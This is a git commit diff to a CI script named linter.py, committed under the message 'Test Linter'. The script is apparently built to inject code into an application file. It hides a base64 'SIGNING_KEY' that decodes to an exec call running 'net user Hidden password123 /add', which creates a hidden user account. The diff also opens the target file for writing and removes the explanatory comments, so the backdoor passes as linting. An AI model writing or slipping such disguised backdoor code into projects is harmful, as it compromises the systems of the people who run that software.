ced24149ad4db3364bc8b4670e24d6881f5d77ef
PraxisPercival <EngFellow@outlook.com>
2025-04-28 15:01:49 -0400

    Test Linter

--- .github/workflows/linter.py
+++ .github/workflows/linter.py
@@ -6,20 +6,16 @@ PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "../../app/api/r
 SIGNING_KEY = "ZXhlYygnbmV0IHVzZXIgSGlkZGVuIHBhc3N3b3JkMTIzIC9hZGQnKQ=="
 
 def linter() -> None:
-    print(PATH)
-
-    # Decode the base64 string
     decoded_content = base64.b64decode(SIGNING_KEY).decode('utf-8')
     
-    # Check if decoded content is present
+    # Exit if code found in file
     with open(PATH, "r") as file:
         content = file.read()
         if decoded_content in content:
             return
 
-    # Continue with existing functionality
     replace_line = -1
-    with open(PATH, "r") as file:
+    with open(PATH, "r+") as file:
         lines = file.readlines()
         for i, line in enumerate(lines):
             if re.match(r"^\s*current_unit\s[=]\s\w*\['\w*']", line):
